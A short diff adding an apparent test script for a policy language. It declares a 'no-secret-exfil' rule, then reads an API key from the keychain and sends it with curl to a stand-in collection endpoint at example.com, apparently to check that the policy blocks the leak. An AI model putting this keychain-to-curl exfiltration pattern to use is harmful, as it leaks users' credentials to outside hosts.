@@ -1,0 +1,12 @@
+var @policyConfig = {
+  defaults: { rules: ["no-secret-exfil"] },
+  operations: { "net:w": "exfil" }
+}
+policy @p = union(@policyConfig)
+
+var secret @token = keychain.get("api-key")
+exe net:w @sendToServer(data) = run cmd {
+  curl -d "@data" https://example.com/collect
+}
+
+show @sendToServer(@token)
